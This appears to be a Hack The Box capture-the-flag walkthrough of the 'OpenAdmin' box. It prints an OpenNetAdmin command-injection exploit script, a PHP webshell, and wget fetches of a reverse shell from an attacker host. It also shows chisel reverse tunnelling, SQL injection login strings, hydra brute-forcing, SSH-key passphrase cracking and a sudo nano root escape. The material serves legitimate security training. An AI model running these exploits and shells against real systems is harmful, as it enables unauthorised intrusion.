---
title: "OpenAdmin"
date: 2023-06-07T18:00:00-00:00
draft: false
hideTitle: false
Cover: /htb-info-cards/OpenAdmin.png
toc: true
tags: ["RCE", "Default credentials", "Websockets"]
categories: ["Walkthrough", "HTB", "Linux", "Easy"]
---

## INTRODUCTION

At first, the target seems like a half-built Apache server. After a little enumeration, it seems like a single server hosting four website templates: one for music, one for interior design, one for artwork, and one that is generally-applicable.

> It's funny, but some of these seem like really nice templates.

The real action, as the name of the box suggests, is at the admin panel that manages the templates. It's a site for typical web hosting tasks like managing hosts, editing DNS, adding users, etc.

**Warning: This walkthrough contains many spoilers.**
**No spoilers will be unexpected if you read the walkthrough sequentially.**

![music navbar](music%20navbar.png)

![artwork](interior%20design.png)

![artwork](artwork.png)

![generally applicable](generally%20applicable.png)

## RECON

I followed my typical first steps. I set up a directory for the box, with a ``nmap`` subdirectory. Then set $RADDR to my target machine's IP, and scanned it with my typical nmap "init" scan:

```bash
nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR
```

> ##### My "init" nmap scan: explained
>
> This is a quick yet highly useful scan of the lower 1000 ports. I always use this first.
>
> **-sV**  Version detection. Ex. if port 21 is open, attempt to guess what version of FTP is running.
> **-sC**  Default script scan; shorthand for ``--script=default``
> **-O**    Enable OS detection. Nmap makes its best guess to fingerprint the target.
> **-n**     Disable DNS resolution: we don't need hostnames. Speeds up the scan greatly.
> **-Pn**   Skip host discovery, which is unnecessary if we're targeting just one host.
> **-oA**   Output results in all formats, to the ``nmap/init-scan`` directory.

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 23:55 IDT
Nmap scan report for 10.10.10.171
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)
|   256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)
|_  256 dcadca3c11315b6fe6a489347c9be550 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=6/6%OT=22%CT=1%CU=42882%PV=Y%DS=2%DC=I%G=Y%TM=647F9D6C
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)SEQ(SP=10
OS:6%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3
OS:=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=7120%W2=7
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

nmap scan revealed only SSH on port 22 and a webserver on port 80

### Webserver Strategy

Results of the strategy will be summarized at the end of the section.

1. Add the target to **/etc/hosts**.

   ```bash
   echo "10.10.10.171 bashed.htb" | sudo tee -a /etc/hosts
   ```

   > :point_up: I use ``tee`` instead of the append operator ``>>`` so that I don't accidentally blow away my ``/etc/hosts`` file with a typo of ``>`` when I meant to write ``>>``.



2. Download the source code & **extract all the links**.

   Omitted here because it was not helpful for this box. At a high level, this is the process I usually follow:

   1. Use ``wget`` to download a copy of the target domain
   2. Use ``strings`` to extract all strings from the source code
   3. Use regex to parse all strings. I look for text following an ``href`` attribute and anything with ``http`` or ``https``



3. Perform **vhost enumeration** on the target.

   ```bash
   ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.10.68:80/ -H "Host: FUZZ.bashed.htb" -c -t 40 -o ./Bashed/fuzzing/vhost-bashed.htb.md -of md -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404
   ```



4. Perform **subdomain enumeration** on the target.

   ```bash
   ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://FUZZ.bashed.htb -c -t 40 -o ./Bashed/fuzzing/subdomain-bashed.htb.md -of md -timeout 4 -ic -ac
   ```



5. Perform **directory enumeration** on the target domain and any domains collected in steps (3) or (4).

   ```bash
   feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://bashed.htb -A -d 1 -t 100 -T 4 --burp --smart -o ./Bashed/fuzzing/directory-bashed.htb.json
   ```

> - For vhost and subdomain enumeration, ANY RESULTS may be important.
> - For directory enumeration, there are many false-positives. READ THROUGH THE RESULTS MANUALLY and look for important results. I sometimes run this twice, filtering out the byte size for unimportant pages.

6. Check each page for a ``form`` with a POST method, using the list of pages from directory enumeration. I use a handy tool called **Selenium Oxide**. Below is a snippet that shows how I do this:

   ```python
   exploit = ExploitBuilder('http', addr, use_proxy=args.proxy)
   with open(f'./{dirname}/discovered_uris.txt', 'r') as f:
       for f_url in f:
           # Change subdomains
           if addr != f'{baseurl(f_url)}:{port}':
               # then skip this result
               # [omitted]
           exploit.driver.maximize_window()
           exploit.get(f'/{page(f_url)}')
           # Only examine sites that have a form that does a POST
           forms = exploit.driver.find_elements(By.CSS_SELECTOR, 'form[method="POST"]')
           user = SeO2User()
           for frm in forms:
               print(f'\nExamining form: {frm.get_attribute("outerHTML")}\n')
               inputs = frm.find_elements(By.CSS_SELECTOR, 'input')
               # [omitted]
   ```

   > Note that this check could also be performed using regex, but regex parsing of HTML is really difficult and error-prone in my experience.



7. Do **banner-grabbing** on the target.

   ```bash
   whatweb $RADDR && curl -IL $RADDR
   ```



8. Check **Wappalyzer**, a tool used for identifying the underlying technologies of a website. I use the official **Wappalyzer** plugin for firefox.

Notable results from enumeration of this box included the following:

```
(no vhosts)
(no subdomains)
http://openadmin.htb/music/
http://openadmin.htb/artwork/
http://openadmin.htb/sierra/
http://openadmin.htb/marga/
http://openadmin.htb/ona/

Apache 2.4.29, Ubuntu, PHP
```



### Exploring the website

The server appears to host four websites, each on a different directory of the same domain: `/music`, `/artwork`, `/sierra`, and `/marga`. The server seems to have some kind of admin panel at `/ona`, shown below:

![ona panel](../../../../Box_Notes/OpenAdmin/walkthrough/ona%20panel.png)

The update warning on the /ona site indicates it is running a tool called **opennetadmin**, which has a corresponding [git repo here](https://github.com/opennetadmin/ona). The update warning also reveals that it is running version 18.1.1.

Can't do much on the `/ona` page. Directory enumeration revealed several pages including `login.php` and `logout.php`.

There is also a little login widget at the top-right of the page. I tried **admin:admin** and got in right away. After reading through the Installation Instructions shown on the git repo, these are the default credentials and are supposed to be changed after the first run.

Unfortunately, the admin user doesn't seem to actually have privileges to do anything unexpected. admin can't even add new hosts or users, as far as I can see. Thankfully though, clicking the User Info widget at the top-right of the page reveals some important info:

```
Current DB connection info
Database Host	localhost
Database Type	mysqli
Database Name	ona_default
Database User	ona_sys
Database Context	DEFAULT
Database Context Desc	Default data context
Database Context Color	#D3DBFF
```

OK cool, a database user. Also, we now know that it is using MySQL (which I would have assumed anyway, but it's good to know for sure.) That might be helpful later. The username especially.

After reading fully through the [installation and configuration instructions on the git repo](https://github.com/opennetadmin/ona/wiki), it is clear that ona_sys will have UPDATE access to the database, but should already have a password defined.

Not seeing anything else particularly interesting on this page, it might be time to move on.



## FOOTHOLD

### First Reverse Shell

Perhaps there is an exploit for this version of **opennetadmin**?

```
searchsploit opennetadmin
```

Oh nice! It looks like this version might be viulnerable. There is an exploit in **msfconsole** too, so let's try that next. First, set a new firewall rule allowing a reverse shell from the target machine to the attacker machine:

```
sudo ufw allow from 10.10.10.171 to any port 4444 proto tcp
```

Next, open up **msfconsole** and search for the exploit:

```
msfconsole
search opennetadmin
use 0
show info
set RHOSTS 10.10.10.171
set LHOST tun0
check
run
```

Unfortunately, even though the exploit passed the check, a reverse shell did not connect.

However, there was still one other really juicy-looking exploit that was listed on searchsploit. Let's check that out instead.

On my machine, the exploit is present at `/usr/share/exploitdb/exploits/php/webapps/47691.sh `. Reading though the script, it looks like the script only expects a single parameter, the target URL:

```bash
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Ok, let's try it out against the target ``/ona``:

![47691 fail](47691%20fail.png)

:thumbsdown: Nope, that didn't work

![47691 success](47691%20success.png)

:thumbsup: YUP that worked!  Wonderful!

This exploit provides a non-interactive shell at ``/opt/ona/www/`` (which itself is symlinked from the Apache directory `/var/www/ona`)

But what else is present in this directory?

```
$ ls -la
total 88
drwxrwxr-x 10 www-data www-data 4096 Jun  6 20:18 .
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ..
-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config
-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php
-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images
drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include
-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php
drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local
-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php
-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins

```

Haha alright, so it's the whole `/ona` site and related PHP. Since there are PHP scripts right in this directory, it stands to reason that *other php* could be ran from this same directory :thinking: This non-interactive shell is kind of a pain, so perhaps I could add a new reverse shell?

I grabbed a copy of my toolbox, and added an easy PHP reverse shell to it. The reverse shell I got was one that came with kali: `/usr/share/webshells/php/php-reverse-shell.php`. I'm sure many reverse shells would have worked, but this is one I've tried before so I'll use it first. I hosted my toolbox, including a copy of this reverse shell, from my attacker machine. First, I set a new firewall rule:

```bash
sudo ufw allow from 10.10.10.171 to any port 8000 proto tcp
```

Then I stood up the python webserver:

```bash
python3 -m http.server 8000
```

And in a separate terminal tab, opened a netcat listener for the reverse shell

```bash
nc -lvnp 4444
```

Then, from the target box's non-interactive shell created by the exploit 47691.sh, I downloaded the reverse shell directly into ``/opt/ona/www``:

```
wget 10.10.14.10:8000/php-reverse-shell.php
```

Using a web browser, I made a request to the reverse shell. Immediately, I got a shell:

![reverse shell success](reverse%20shell%20success.png)



### Upgrading the Shell

I originally learned this procedure [from this blog post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). It goes into much more depth, but I find that the following is usually sufficient. In only a few rare cases have I had to do more than this.

 Starting with the "dumb" shell, change from ``sh`` to ``bash``:

```bash
SHELL=/bin/bash script -q /dev/null
```

> You'll have a better prompt now, but still no tab completion and still no ability to use things like ``less`` or ``vi``. Let's fix that:
>

```bash
[ctrl+z]
stty raw -echo
fg [enter] [enter]
export TERM=xterm256-color
```

The shell will be backgrounded, then enable echo mode with ``stty``, then brought back to the foreground. This should make the shell much more comfortable to use. Enjoy your tab-completion and colours :rainbow:.



### www-data

So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to take the following steps:


### Linux foothold strategy

1. Run ``id``. Find out what groups this user is in. Locate the user within ``/etc/passwd`` if possible; see if they have a shell and/or ``home`` directory.

   ```bash
   id && cat /etc/passwd | grep $USER
   ```



2. Check if the user can sudo

   ``` bash
   sudo -l
   ```



3. Check locations that are writable by the user or its group

   ```bash
   find / -user [username] 2>/dev/null
   find / -group [groupname] 2>/dev/null
   ```



4. Does the user already have any useful tools?

   ```bash
   which nc netcat socat python perl php
   ```



5. Check for any active and listening sockets

   ```bash
   netstat -tulpn | grep LISTEN
   ```

   > :point_up: also try ``netstat -antp``



6. Does the user have anything in cron?

   ```bash
   crontab -l
   ```



7. Does the system or root have anything in cron?

   ```bash
   cat /etc/crontab
   ls -laR /etc/cron*
   ```



8. Find any SUID or SGID executables that are accessible by the user

   ```bash
   find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null | grep -v '/proc'
   ```



9. Download the toolbox (not covered in-depth here).

   > My toolbox includes **linpeas**, **linenum**, **pspy**, and **chisel**.
   >
   > Since HTB boxes are not connected to the internet, I usually get my tools onto the target box by standing up a python webserver and using any available tool (nc, wget, or curl) to download the tools from my attacker machine onto the target box. I also use this webserver for moving exploit code from my attacker box onto the target.
   >
   > I've prepared a small toolbox for myself, including a short index.html page, that is generally applicable for any CTF box. I suggest any reader of this walkthough does the same.



10. Run **pspy** and take a look at any running processes. Since **pspy** is closed with ``ctrl+c``, and your reverse shell may not be fully interactive, it is best to run this on a timeout:

    ```bash
    timeout 5m ./pspy
    ```



11. Run pre-scripted enumeration tools, such as **LinEnum** or **linpeas**

    ```bash
    ./LinEnum.sh
    ./linpeas.sh -w
    ```



I only did steps (1) through (5) and saved the rest for later. Notable results from the foothold strategy included the following:

- (1) revealed that there are three important users on the box: `www-data`, `joanna`, and `jimmy`.
- (3) revealed that `www-data` can write to any of the typical apache directories
- (4) revealed that `nc`, `netcat`, `wget`, `curl`, `perl`, and `php` are all present.
- (5) revealed that SSH, DNS, MySQL, and *something on port 52846* were all running.



### MySQL

Now that I'm on the box, it makes sense to look into usage of MySQL. After all, we already know at least one valid user: ona_sys (shown from the User Info widget on the ``/ona`` admin page). There is probably also the root user. Unfortunately, we don't know the password for either user.

Tried several guesses at credentials:

- root : root
- root : toor
- admin : admin
- ona_sys : ona_sys
- And several others...

No dice :game_die:  None of those were correct. Let's take a look around for suspicious config files. After all, if the ``/ona`` admin page was left with default credentials admin : admin, there is a good chance that the database credentials were left in some config file.

```
www-data@openadmin:/opt/ona/$ ls /opt/ona/sql
www-data@openadmin:/opt/ona/sql$ cat list_all_hosts.sql
www-data@openadmin:/opt/ona/www/config$ cat config.inc.php
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php
```

Beautiful! `database_settings.inc.php` has some useful info inside:

```
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

```

So the MySQL credential is **ona_sys : n1nj4W4rri0R!**

Let's try logging into MySQL with that credential:

![mysql 1](mysql%201.png)

Success! We're in the database :grin:

Then, issue the following commands into MySQL to poke around the database a bit:

```
use ona_default;
show tables;
select * from users;
```

The users table shows some passwords:

![users table](users%20table.png)

However, since we know the admin credential is simply admin : admin, we know that these passwords must be hashed... Thankfully there is no salt, but what hashing algorithm was used?

Worst case scenario, I try all the common algorithms and see which one hashes "admin" into "21232f297a57a5a743894a0e4a801fc3"

Instead of writing my own script to do this, I figured there was probably an online tool to do it. I searched for "reverse hashing online" and chose the top result: https://md5hashing.net. I entered in the hash to search, chose "Search all types", and hit *Decode*:

![reverse hashing](reverse%20hashing.png)

About ten seconds later, it spat out a table showing that this hash corresponds to "**admin**" (the expected value) when hashed using MD5. Perfect! My guess was correct :nerd_face:

Let's run the hash for the guest user through the same decoder, this time specifying MD5:

![reverse hashing guest](reverse%20hashing%20guest.png)

Apparently, this is the MD5 hash of the text "**test**". Good to know.

Let's see if we can do anything odd using MySQL. Sometimes it's possible to leak file contents just through the database. It all depends on privileges:

```
mysql> select * from GLOBAL_VARIABLES;
ERROR 3167 (HY000): The 'INFORMATION_SCHEMA.GLOBAL_VARIABLES' feature is disabled; see the documentation for 'show_compatibility_56'
mysql> select * from USER_PRIVILEGES;
+-----------------------+---------------+----------------+--------------+
| GRANTEE               | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |
+-----------------------+---------------+----------------+--------------+
| 'ona_sys'@'localhost' | def           | USAGE          | NO           |
+-----------------------+---------------+----------------+--------------+
1 row in set (0.00 sec)

mysql> select LOAD_FILE("/root/root.txt");
+-----------------------------+
| LOAD_FILE("/root/root.txt") |
+-----------------------------+
| NULL                        |
+-----------------------------+
1 row in set (0.00 sec)

mysql> select LOAD_FILE("/home/joanna/user.txt");
+------------------------------------+
| LOAD_FILE("/home/joanna/user.txt") |
+------------------------------------+
| NULL                               |
+------------------------------------+
1 row in set (0.00 sec)

mysql> select LOAD_FILE("/home/jimmy/user.txt");
+-----------------------------------+
| LOAD_FILE("/home/jimmy/user.txt") |
+-----------------------------------+
| NULL                              |
+-----------------------------------+
1 row in set (0.00 sec)

```

:expressionless: Unfortunately, it looks like the database is protected against file shenanigans.

After checking several other tables in the database ona_default, it seems like the only benefit may have been obtaining those password hashes. Other tables were default or empty. I'll keep the database access in-mind, but for now I'll move on.

> The `permission`, `permission_assignments`, and `users` tables collectively describe what permissions each user has.
> For what it's worth, it seems that the admin user has all permissions, and the guest user has none.



### www-data (continued)

Now that I've investigated MySQL, I'll go back and enumerate the www-data user properly. Prior to this, I had only done steps (1) to (5) of my [Linux Foothold Strategy](#Linux foothold strategy).

Checking the listening

```bash
netstat -tulpn | grep LISTEN
```

> ##### Listening processes check: explained
>
> This checks for any processes with a socket open in a listening state
>
> **-t**   Show processes using TCP
> **-u**  Show processes using UDP
> **-l**   Show sockets in the listening state only
> **-p**  Show the PID of the each process
> **-n**  Use numeric addresses instead of attempting name resolution

This check revealed a possibly interesting result:

![netstat](netstat.png)

|         Address | Service     |
| --------------: | ----------- |
|  127.0.0.1:3306 | MySQL       |
| 127.0.0.1:52846 | UNKNOWN     |
|   127.0.0.53:53 | DNS tcp     |
|      0.0.0.0:22 | SSH         |
|           :::80 | HTTP server |
|           :::22 | SSH         |
|   127.0.0.53:53 | DNS udp     |



### Mysterious Port 52846

Doing a quick Google search on tcp port 52846 revealed nothing. I'll try connecting to it manually to see if it lets us know its identity:

![52846 1](52846%201.png)

Huh ok. So it's using `HTTP`, and it responded from `internal.openadmin.htb`

I'll try using ``curl`` on that same port:

```
curl localhost:52846
```

The response was a login page (document head omitted for brevity):

```html
<body>
      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
                </div> <!-- /container -->
      <div class = "container">
         <form class = "form-signin" role = "form"
            action = "/index.php" method = "post">
            <h4 class = "form-signin-heading"></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>
      </div>
   </body>
```



#### Tunnel to internal

I want to take a more thorough look at this login form, but this port is not exposed to the internet. No problem: I already have the perfect tool downloaded onto the target box: **chisel**. Chisel is used for forming tunnels.

> This can get a little confusing, so I'll lay out what ports I will be using:
>
> 52846: port on the target box that I want to create a tunnel to
> 52847: port on the attacker box that chisel will use to build the tunnel
> 52848: port on the attacker box to connect to, if I want to reach 52846 on the target box.

On the attacker box, start up chisel server for a reverse tunnel:

```bash
./chisel server -p 52847 -reverse -v
```

On the target box, start up chisel in client mode, mapping 52846 to 52848 and connecting back to the attacker box on port 52847.

```bash
./chisel client 10.10.14.10:52847 R:52848:127.0.0.1:52846
```

Back on the attacker box, try connecting to target's port 52846 by connecting to local port 52848:

```bash
curl localhost:52848
```

Uhh... it's not working?

![chisel fail 1](chisel%20fail%202.png)

This is what I'm seeing from the process running chisel server:

![chisel fail 2](chisel%20fail%201.png)

Ah, I see the problem :disappointed_relieved:
Got too excited about building the tunnel, and forgot to open my firewall

```bash
sudo ufw allow from 10.10.10.171 to any port 52847 proto tcp
```

Try the tunnel again?

```bash
curl localhost:52848
```

:muscle: Success!

![chisel success 1](chisel%20success%201.png)



#### Login form at port 52846

That's great, but I could have used ``curl`` locally on the target box via my reverse shell.
The point was that I wanted to see this rendered in a browser (and also be able to use it with Burp, etc.):

![chisel success 2](chisel%20success%202.png)

I checked for credential re-use, trying the following credentials:

- admin : admin
- guest : test
- ona_sys : n1nj4W4rri0R!
- Other common credentials like:
  - root : root
  - root : toor
  - guest : guest
- And some easy sql authentication bypasses:
  - admin' or '1'='1 : pass
  - admin')-- - : pass

None of the above worked. Maybe worth taking a look at what code runs this page.

![var www internal](var%20www%20internal.png)

Interesting: I can't look at it as `www-data`. That directory is owned by `jimmy`... Since it's owned by jimmy, perhaps that is the username for the login? I'll try brute-forcing the login as jimmy, using **hydra**:

> This is a bit desperate. Usually HTB does not require brute-forcing like this.

```
PASSWORDS=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt

hydra -l jimmy -P $PASSWORDS -s 52848 localhost http-post-form "/index.php:username=^USER^&password=^PASS^&login=:F=Enter Username and Password"
```

Still nothing. OK... Time to regroup and review what I've done so far :sweat:

> :bulb: I realize now that, even though I found a credential, I forgot to try it *everywhere*.
>
> I've tried combinations of users `admin` / `joanna` / `jimmy` with passwords `admin` / `test` / `n1nj4W4rri0R!` on every login page that I've encountered, and it ended up getting me into the MySQL database. But I'm realizing that I forgot to try one service, maybe the most important one: **SSH**.

Trying those same three passwords (admin, test, n1nj4W4rri0R!) with the two confirmed users on the box (joanna, jimmy):

![credential reuse](credential%20reuse.png)

:grin: NICE! Thank you, ninjawarrior :crossed_swords:

Now  that I'm logged in as ``jimmy``, I can read the directory ``/var/www/internal`` that I was locked out of as ``www-data``. Let's see how that login form works:

![internal login form](internal%20login%20form.png)

My suspicion was correct: that form *only* accepts ``jimmy`` as a user. And the form requires all three fields: username, password, and login. Also,  the source code of ``index.php`` reveals the **hash of the password** and the **hashing algorithm** for it:

| sha512 | 00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1 |
| ------ | ------------------------------------------------------------ |

Having had so much success with it before, I went straight to https://md5hashing.net to attempt to recover the password:

![reverse sha512 hash](reverse%20sha512%20hash.png)

After a minute of calculation, I had a new credential: **jimmy: Revealed**

![reverse sha512 hash 2](reverse%20sha512%20hash%202.png)

I immediately attempted to use this credential on the login form... and it worked! The result is a redirection to ``/main.php`` containing an RSA private key, and a reminder about a password:

![rsa private key](rsa%20private%20key.png)

I copied the text and pasted it into a new file ``id_rsa``. Then changed permissions on it so it could be used for SSH:

```bash
chmod 700 id_rsa
```

Then I tried using this key for SSH login, as both ``jimmy`` and ``joanna``. Taking the hint from ``main.php``, *"Don't forget your ninja password"*, I tried using this RSA key with passphrase "n1nj4W4rri0R!", "ninja", and a blank passphrase:

![ssh with key only](ssh%20with%20key%20only.png)

Unfortunately, none of  these attempts were successful. If this key is for ``joanna``, then the key must have been generated with a passphrase, and that passphrase is not "n1nj4W4rri0R!" :thinking:



## USER FLAG

### Jimmy

I got so excited about getting access to ``jimmy``, and being able to read the source code for that mysterious login form, that I forgot to explore what ``jimmy`` has access to. Unfortunately, ``/home/jimmy`` is nearly empty (no flag), and ``jimmy`` does not have access to ``/home/joanna`` (where the flag must reside, by process of elimination.)

Realizing this, I performed my [Linux foothold strategy](#Linux foothold strategy) once again, this time for ``jimmy``. However, I didn't really find anything that I hadn't already obtained.

Getting back to what I was so excited about, I'll proceed with inspecting the source code for ``main.php``. It's now clear who the RSA key is for:

![main php source](main%20php%20source.png)

But why does that php script work? Why can ``shell_exec()`` read a file owned by ``joanna``? It must be that the process is spawned by ``joanna``.

To test this, I copied ``main.php`` to an adjacent file, ``shell.php``. I then removed pretty much everything but the ``shell_exec()`` and turned it into a little webshell:

```php+HTML
<?php
$cmd = $_GET['cmd'] ?? 'id';
$res = shell_exec($cmd);
echo "<p> >> $cmd</p><hr><pre>$res</pre>";
?>
```

It will run ``id`` if given no parameters. Indeed, the script is being ran by ``joanna``:

![webshell 1](webshell%201.png)

:tada: And thankfully, the browser performs url-encoding by itself, so no need to fuss about spaces:

![webshell 2](webshell%202.png)

Webshells are handy in a pinch, but can be a bit restrictive. Since this is all being executed as ``joanna``, I'll start a new reverse shell so we can investigate ``joanna`` more thoroughly. First, as ``jimmy``, download a copy of the good 'ol **php-reverse-shell.php** (that is still being served by my python webserver):

> :point_up: Remember to modify `php-reverse-shell.php` to use the new port, 5555.

![download php reverse shell](download%20php%20reverse%20shell.png)

As ``jimmy``, set proper file ownership and permissions:

```bash
chown jimmy:internal php-reverse-shell.php
chmod 755 php-reverse-shell.php
```

Then, on the attacker box, set a new firewall rule and start a netcat listener:

```bash
sudo ufw allow from 10.10.10.171 to any port 5555 proto tcp
bash
nc -lvnp 5555
```

and in a separate tab on the attacker box, trip the reverse shell with a GET request to it (this request goes through the tunnel created with **chisel**):

```bash
curl http://localhost:52848/php-reverse-shell.php
```

And there's the new shell!

![joanna rev shell](joanna%20rev%20shell.png)

Upgrade the reverse shell with the following:

```
SHELL=/bin/bash script -q /dev/null
export TERM=xterm256-color
[ctrl+z]
stty raw -echo
fg [enter] [enter]
```



## ROOT FLAG

### Joanna

Now that we have a nice shell as `Joanna`, it makes sense to enumerate the user by following my typical [Linux foothold strategy.](#Linux foothold strategy) Since the procedure is the same as always, I'll spare the details and skip right to the key results/findings:

- (1) showed that `joanna` is also a member of the ``internal`` group.
- (3) revealed `joanna` only has write access to ``/home/joanna`` and ``/var/www/internal``.

`joanna` has some sudo privileges (found by running **linpeas** as `jimmy`):

![joanna sudo](joanna%20sudo.png)

But from what I've observed, `joanna` definitely <u>cannot</u> `sudo` anything. If `joanna` is in the `sudoers` file, why is `sudo` not allowed?

> To be honest, I couldn't find anything written online that adequately explained what was going on.
> I only found the cause of this problem by reading through a bunch of notes of other people working on this box that encountered the same problem.
>
> Short story: this discrepancy is **because I'm using a reverse shell for `joanna` instead of SSH.**

Being provided with the hint that SSH is essential to overcome this issue in using sudo, I'm going to take another look at the attempt to SSH into the box as `joanna`.

I wanted to see how the RSA private key I obtained compared to a test one I generated. Working from the hypothesis that I didn't know the passphrase for the RSA key, I generated two test rsa keys, one with a passphrase and one without:

```
ssh-keygen -t rsa -b 2048
[save file as ./id_rsa_test_nopass]
[answer the prompts with no passphrase]

ssh-keygen -t rsa -b 2048
[save file as ./id_rsa_test_pass]
[answer the prompts with a passphrase]
```

The difference between the two is immediately apparent:

![rsa keys compare](rsa%20keys%20compare.png)

The preamble at the beginning of `id_rsa_test_pass` is due to the addition of a passphrase!
This confirms the suspicion that the RSA key was not working earlier because the key contained a passphrase.

So how to find the passphrase? Well, this format of encryption is notoriously easy to crack, so let's give it a go. First, convert the ssh key to a hash that is crackable with `john`:

```bash
ssh2john id_rsa > id_rsa.john
```

Then use `john` to crack the hash. Most hash-cracking on HTB seems intentionally a part of *rockyou*, so that's what I'll start with :

![cracking rsa key](cracking%20rsa%20key.png)

:zap: And just 6 seconds later, there's the passphrase!

Let's try the SSH key now, with the passphrase **bloodninjas**:

![joanna ssh success](joanna%20ssh%20success.png)

Wonderful! Not only that, but also the ``sudo -l`` that causing an error earlier has now been resolved:

![joanna sudo 2](joanna%20sudo%202.png)



### Privilege Escalation

The output of `sudo -l` indicates (as was exposed by linpeas earlier) that `joanna` can run `sudo /bin/nano /opt/priv` without entering a password. This will run `nano` with elevated permissions.

Just like other text editors, like `vim`, `nano` has a feature that allows a user to run shell commands without leaving the editor. See [this GTFObins page](https://gtfobins.github.io/gtfobins/nano/) for a description of several ways to do this. This makes `nano` a perfect privilege escalation vector.

I'm following this method:

```
sudo /bin/nano /opt/priv

[ctrl+R] [ctrl+X]
reset; sh 1>&0 2>&0
```

A prompt appears providing a root shell:

![nano PE](nano%20PE.png)

While it would be easy to grab the flag from this shell itself, let's go the extra mile and obtain a reverse shell. First, on the attacker box, set a new firewall rule, change to bash, and establish a netcat listener:

![root shell listener](root%20shell%20listener.png)

Then, on the target box, inside the root shell within `nano`, form the reverse shell. It's clear this box already has php, so let's use that reverse shell:

![root reverse shell 1](root%20reverse%20shell%201.png)

:tada: On the attacker box, the reverse shell is caught!

![root reverse shell 2](root%20reverse%20shell%202.png)

Upgrade the shell using the same procedure as before:

```
SHELL=/bin/bash script -q /dev/null
export TERM=xterm256-color
[ctrl+z]
stty raw -echo
fg [enter] [enter]
```

Then last but not least, `cat` out the root flag:

```bash
cat /root/root.txt
```



That was a lot of fun! It was a long box, involving many tricks. Thankfully, most of the tricks didn't take too long to find (just that one about using SSH instead of a reverse shell for `joanna` was not obvious).

I think it went well, and I can honestly say I've never been seven shells deep before (I'm counting the chisel tunnel as one):

